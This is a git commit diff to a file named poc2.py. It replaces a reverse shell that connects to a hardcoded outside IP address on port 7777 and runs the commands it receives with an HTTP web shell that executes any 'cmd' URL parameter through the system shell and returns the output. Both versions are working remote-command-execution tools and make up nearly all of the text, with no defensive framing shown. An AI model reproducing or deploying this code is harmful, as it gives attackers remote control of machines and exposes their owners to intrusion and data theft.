f8a8dbdd827147999d8f7e4cde34877bae64bd77
marcusovkost <nemarcusov@gmail.com>
2025-01-25 18:54:31 +0300

    Update poc2.py

--- poc2.py
+++ poc2.py
@@ -1,19 +1,35 @@
-import socket
+from http.server import BaseHTTPRequestHandler, HTTPServer
 import subprocess
+import urllib.parse
 
+class SimpleShellServer(BaseHTTPRequestHandler):
+    def do_GET(self):
+        parsed_path = urllib.parse.urlparse(self.path)
+        command = urllib.parse.parse_qs(parsed_path.query).get('cmd', [None])[0]
+        
+        if command:
+            try:
+                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b"<pre>" + output + b"</pre>")
+            except subprocess.CalledProcessError as e:
+                self.send_response(500)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b"Error executing command: " + str(e).encode())
+        else:
+            self.send_response(400)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b"Please provide a command using the 'cmd' parameter")
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def run(server_class=HTTPServer, handler_class=SimpleShellServer, port=8080):
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    print(f'Starting server on port {port}')
+    httpd.serve_forever()
 
-
-s.connect(('95.165.8.178', 7777))
-
-
-while True:
-    command = s.recv(4096).decode()
-    if command.lower() == 'exit':
-        break
-    output = subprocess.getoutput(command)
-    s.send(output.encode())
-
-
-s.close()
+if __name__ == "__main__":
+    run()
